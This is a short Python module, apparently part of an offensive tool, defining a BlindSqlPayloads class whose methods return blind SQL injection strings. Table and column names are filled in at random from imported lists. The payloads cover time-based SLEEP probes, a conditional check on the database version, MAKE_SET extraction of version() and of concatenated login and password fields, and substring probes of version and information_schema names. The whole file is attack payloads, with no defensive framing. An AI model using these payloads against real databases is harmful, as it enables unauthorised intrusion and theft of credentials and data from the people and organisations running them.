import os
import sys
current_directory = os.getcwd()

sys.path.append(current_directory)

from INFO.common import columns
from INFO.common import tables
from random import choice
class BlindSqlPayloads:
    @staticmethod
    def binsqlpayload(column=choice(columns),table=choice(tables)):
        payload = f"""
' OR (SELECT (CASE WHEN EXISTS(SELECT {column} FROM {table} WHERE {column} REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); -- -
 """
        retval = payload
        return retval
    
    @staticmethod
    def conditional_blind_sql_injection():
        payload = f"""
2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
 """
        retval = payload
        return retval
    
    @staticmethod
    def make_set_sql_injection():
        payload = """ 
AND MAKE_SET(YOLO<(SELECT(length(version()))),1)
AND MAKE_SET(YOLO<ascii(substring(version(),POS,1)),1)
AND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)
AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)
    """
        retval = payload
        return retval
    
    @staticmethod
    def sub_string_sql_inj(column=choice(columns)):
        payload = f"""
?{column}=1 and substring(version(),1,1)=5
?{column}=1 and right(left(version(),1),1)=5
?{column}=1 and left(version(),1)=4
?{column}=1 and ascii(lower(substr(Version(),1,1)))=51
?{column}=1 and (select mid(version(),1,1)=4)
?{column}=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
?{column}=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
 """
        retval = payload
        return retval
    
    